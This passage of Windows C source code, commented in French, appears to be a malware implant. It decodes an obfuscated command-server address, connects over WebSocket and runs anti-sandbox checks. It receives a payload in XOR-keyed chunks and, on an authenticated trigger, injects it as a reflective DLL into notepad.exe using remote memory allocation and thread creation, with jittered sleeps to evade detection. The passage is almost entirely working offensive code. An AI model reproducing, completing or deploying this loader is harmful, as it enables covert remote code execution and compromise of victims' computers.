            printf("[DEBUG] Thread terminé, exit_code=%lu\n", exit_code);
        } else if (wait_result == WAIT_TIMEOUT) {
            printf("[DEBUG] Thread timeout (normal pour payload persistant)\n");
        } else {
            printf("[DEBUG] WaitForSingleObject erreur: %lu\n", wait_result);
        }
        CloseHandle(hThread);
    } else {
        //  Libérer mémoire si thread échoue
        printf("[DEBUG] ERREUR: Thread non créé, libération mémoire\n");
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    }

    if (pid != GetCurrentProcessId()) CloseHandle(hProcess);
    printf("[DEBUG] Injection terminée\n");
}

// ========== WEBSOCKET ==========

SOCKET setup_websocket(int retry) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return INVALID_SOCKET;
    
    for (int attempt = 0; attempt < retry; attempt++) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            Sleep(RETRY_DELAY * (1 << attempt));
            continue;
        }

        // ===== DÉOBFUSCATION =====
        unsigned char host_obf[] = WS_HOST_XOR;
        deobfuscate_string(host_obf, sizeof(host_obf) - 1, 0xFF);
        
        // ===== CALCUL DU PORT =====
        int port = WS_PORT_OBF ^ 0xFFFF;
        char port_str[16];
        snprintf(port_str, sizeof(port_str), "%d", port);
        
        printf("[DEBUG] Connexion à %s:%s\n", (char*)host_obf, port_str);
        
        // ===== RÉSOLUTION DNS (NOUVEAU!) =====
        struct addrinfo hints = {0};
        struct addrinfo *result = NULL;
        
        hints.ai_family = AF_INET;        // IPv4
        hints.ai_socktype = SOCK_STREAM;  // TCP
        
        int dns_ret = getaddrinfo((char*)host_obf, port_str, &hints, &result);
        if (dns_ret != 0 || result == NULL) {
            printf("[DEBUG] DNS FAILED: %d\n", dns_ret);
            closesocket(s);
            Sleep(RETRY_DELAY * (1 << attempt));
            continue;
        }
        printf("[DEBUG] DNS OK!\n");
        
        // ===== CONNEXION =====
        if (connect(s, result->ai_addr, (int)result->ai_addrlen) != 0) {
            printf("[DEBUG] Connect FAILED: %lu\n", GetLastError());
            freeaddrinfo(result);
            closesocket(s);
            Sleep(RETRY_DELAY * (1 << attempt));
            continue;
        }
        freeaddrinfo(result);
        printf("[DEBUG] TCP connecté!\n");

        // ===== HANDSHAKE WEBSOCKET =====
        unsigned char key_bin[16];
        for (int i = 0; i < 16; i++) key_bin[i] = rand() & 0xFF;
        
        char key_b64[32];
        base64_encode_key(key_bin, 16, key_b64);
        
        char handshake[512];
        snprintf(handshake, sizeof(handshake),
            "GET / HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: %s\r\n"
            "Sec-WebSocket-Version: 13\r\n\r\n", (char*)host_obf, key_b64);

        send(s, handshake, strlen(handshake), 0);

        char resp[4096];
        int n = 0;
        int attempts_recv = 0;
        while (n < (int)sizeof(resp) - 1 && attempts_recv < 10) {
            int r = recv(s, resp + n, sizeof(resp) - n - 1, 0);
            if (r <= 0) break;
            n += r;
            resp[n] = '\0';
            if (strstr(resp, "\r\n\r\n")) break;
            attempts_recv++;
        }
        
        if (n > 0 && strstr(resp, "101 Switching Protocols")) {
            printf("[DEBUG] WebSocket handshake OK!\n");
            u_long mode = 1;
            ioctlsocket(s, FIONBIO, &mode);
            return s;
        }
        
        printf("[DEBUG] Handshake FAILED\n");
        closesocket(s);
        Sleep(RETRY_DELAY * (1 << attempt));
    }
    
    WSACleanup();
    return INVALID_SOCKET;
}

void send_ping(SOCKET sock) {
    unsigned char ping[2] = { 0x89, 0x00 };
    send(sock, (char*)ping, 2, 0);
}

void handle_frame_control(SOCKET sock, unsigned char *buffer, int len) {
    if (len < 2) return;
    
    uint8_t opcode = buffer[0] & 0x0F;
    uint8_t fin = (buffer[0] >> 7) & 1;
    
    if (opcode == 0x9 && fin) {
        unsigned char pong[128];
        pong[0] = 0x8A;
        
        int payload_len = buffer[1] & 0x7F;
        if (payload_len < 126) {
            pong[1] = payload_len;
            if (payload_len > 0 && len > 2) {
                memcpy(pong + 2, buffer + 2, payload_len);
            }
            send(sock, (char*)pong, 2 + payload_len, 0);
        }
    }
}

// ========== MAIN ==========

int main(void) {
    // DEBUG: Activer console
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    printf("[DEBUG] Agent démarré PID=%lu\n", GetCurrentProcessId());
    
    srand((unsigned int)(GetTickCount() ^ GetCurrentProcessId()));
    
    
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        cached_nt_create_thread_ex = GetProcAddress(ntdll, "NtCreateThreadEx");
    }
    
    if (!anti_sandbox_checks()) return 0;

    // [SUPPRESSION BLOC 1 - DÉBUT]
    // Ancien système de chargement DLL en Base64 SUPPRIMÉ
    // Remplacer le bloc de traitement actuel par la nouvelle logique 4 opcodes.
    
    
    SOCKET ws = setup_websocket(RETRY_COUNT);
    if (ws == INVALID_SOCKET) {
        printf("[DEBUG] ERREUR: Connexion échouée!\n");
        asm_cleanup();
        WSACleanup();
        return 1;
    }
    printf("[DEBUG] WebSocket connecté!\n");

    CircularBuffer cb;
    circ_init(&cb);
    
    //  Allocation dynamique au lieu de stack
    unsigned char *payload = (unsigned char*)malloc(MAX_FRAME_SIZE);
    if (!payload) {
        printf("[DEBUG] ERREUR: malloc payload failed!\n");
        closesocket(ws);
        WSACleanup();
        return 1;
    }
    unsigned char temp_recv[512];
    DWORD last_ping = GetTickCount();
    
    while (1) {
    int ret = recv(ws, (char*)temp_recv, sizeof(temp_recv), 0);

    if (ret > 0) {
        circ_write(&cb, temp_recv, ret);
    } else if (ret == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK && err != WSAECONNRESET) {
            break;
        }
    } else if (ret == 0) {
        break;
    }

    DWORD now = GetTickCount();
    if ((now - last_ping) >= PING_INTERVAL || (now < last_ping)) {
        send_ping(ws);
        last_ping = now;
    }

    if (circ_available(&cb) >= 2) {
        unsigned char header[10];
        int avail = circ_available(&cb);
        int peek_len = (avail > 10) ? 10 : avail;
        if (circ_peek(&cb, header, peek_len) == 0) {
            int frame_size = estimate_frame_size(header, peek_len);
            
            if (frame_size > 0 && frame_size <= MAX_FRAME_SIZE && circ_available(&cb) >= frame_size) {
                unsigned char *frame_data = malloc(frame_size);
                if (!frame_data) continue;
                
                circ_read(&cb, frame_data, frame_size);
                
                uint8_t opcode = frame_data[0] & 0x0F;
                
                // Frames de contrôle WebSocket (ping/pong/close)
                if (opcode >= 0x8) {
                    handle_frame_control(ws, frame_data, frame_size);
                    free(frame_data);
                    continue;
                }
                
                // Parser la frame WebSocket
                int payload_len = 0;
                if (parse_ws_frame(frame_data, frame_size, payload, &payload_len) == 0) {
                    
                    // OPCODE 0x04: INIT
                    if (opcode == WS_OP_CHUNK_INIT) {
                        printf("[DEBUG] INIT reçu, payload_len=%d\n", payload_len);
                        size_t expected_size = 0;
                        uint8_t xor_key = 0;
                        int init_ret = parse_chunk_init(payload, payload_len, &expected_size, &xor_key);
                        printf("[DEBUG] parse_chunk_init=%d, size=%zu, key=0x%02X\n", init_ret, expected_size, xor_key);
                        if (init_ret == 0) {
                            int asm_ret = asm_init(expected_size, xor_key);
                            printf("[DEBUG] asm_init=%d\n", asm_ret);
                        }
                        free(frame_data);
                        continue;
                    }
                    
                    // OPCODE 0x03: DATA
                     if (opcode == WS_OP_CHUNK_DATA && g_asm.is_initialized && !g_asm.is_complete) {
                        printf("[DEBUG] DATA reçu, payload_len=%d\n", payload_len);
                        unsigned char *chunk_data = NULL;
                        size_t chunk_size = 0;
                        if (parse_chunk_data(payload, payload_len, &chunk_data, &chunk_size) == 0) {
                            int app_ret = asm_append(chunk_data, chunk_size);
                            printf("[DEBUG] asm_append=%d, total=%zu/%zu\n", app_ret, g_asm.current_size, g_asm.expected_size);
                            Sleep(150 + (chunk_size / 1024) + (rand() % 200));
                        }
                        free(frame_data);
                        continue;
                    }
                    
                    // OPCODE 0x05: FINAL
                    if (opcode == WS_OP_CHUNK_FINAL) {
                        printf("[DEBUG] FINAL reçu, is_complete=%d\n", g_asm.is_complete);
                        unsigned char expected_hash[32];
                        if (parse_chunk_final(payload, payload_len, expected_hash) == 0) {
                            int fin_ret = asm_finalize(expected_hash);
                            printf("[DEBUG] asm_finalize=%d (0=OK, -4=hash mismatch)\n", fin_ret);
                            if (fin_ret != 0) {
                                printf("[DEBUG] ERREUR: Hash mismatch! Cleanup.\n");
                                asm_cleanup();
                            }
                        }
                        free(frame_data);
                        continue;
                    }
                    
                    // OPCODE 0x02: TRIGGER
                    printf("[DEBUG] Frame opcode=0x%02X, payload_len=%d\n", opcode, payload_len);
                    if (opcode == 0x02 && payload_len == SIGNAL_SIZE) {
                        printf("[DEBUG] TRIGGER reçu!\n");
                        unsigned char expected_magic[32] = {
                            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
                            0x13, 0x37, 0xC0, 0xDE, 0xDE, 0xAD, 0xBE, 0xEF,
                            0xCA, 0xFE, 0xBA, 0xBE, 0x13, 0x37, 0xC0, 0xDE,
                            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE
                        };
                        
                        int magic_ok = (memcmp(payload, expected_magic, 32) == 0);
                        int timing_ok = validate_signal_timing(payload);
                        int hmac_ok = verify_hmac_sha256(payload, 40, payload + 40);
                        printf("[DEBUG] magic=%d, timing=%d, hmac=%d\n", magic_ok, timing_ok, hmac_ok);
                        
                        if (magic_ok && timing_ok && hmac_ok) {  //  Fusionné
                            DWORD target = find_process_by_name("notepad.exe");
                            printf("[DEBUG] notepad PID=%lu\n", target);
                            if (target == 0) target = GetCurrentProcessId();
                            printf("[DEBUG] Target PID=%lu\n", target);
                            
                            printf("[DEBUG] Buffer: complete=%d, buffer=%p, size=%zu\n", 
                                   g_asm.is_complete, g_asm.buffer, g_asm.current_size);
                            
                            if (g_asm.is_complete && g_asm.buffer && g_asm.current_size > 0) {
                                size_t inject_size = g_asm.current_size;  //  SAUVEGARDER AVANT CLEANUP
                                printf("[DEBUG] Préparation injection %zu bytes\n", inject_size);
                                
                                unsigned char *to_inject = malloc(inject_size);
                                if (!to_inject) {
                                    printf("[DEBUG] ERREUR: malloc échoué!\n");
                                    asm_cleanup();
                                    free(frame_data);
                                    continue;  //  continue au lieu de break
                                }
                                
                                memcpy(to_inject, g_asm.buffer, inject_size);
                                asm_cleanup();  //  Cleanup APRÈS copie
                                
                                printf("[DEBUG] Appel inject_reflective_dll...\n");
                                inject_reflective_dll(target, to_inject, inject_size);  //  Utilise inject_size
                                printf("[DEBUG] Injection terminée!\n");
                                
                                Sleep(500);
                                
                                SecureZeroMemory(to_inject, inject_size);
                                free(to_inject);
                            } else {
                                printf("[DEBUG] ERREUR: Conditions non remplies (complete=%d, buffer=%p, size=%zu)\n",
                                       g_asm.is_complete, g_asm.buffer, g_asm.current_size);
                                asm_cleanup();
                            }
                        }
                        free(frame_data);
                        continue;
                    }
                }
                free(frame_data);
            }
        }
    }

    // Timeout check
    asm_check_timeout();
    
    int jitter = 300 + (rand() % 400);
    Sleep(jitter);
}

    asm_cleanup();
    
    //  Libération du buffer dynamique
    if (payload) {
        SecureZeroMemory(payload, MAX_FRAME_SIZE);
        free(payload);
        payload = NULL;
    }
    
    closesocket(ws);
    WSACleanup();
    
    return 0;
}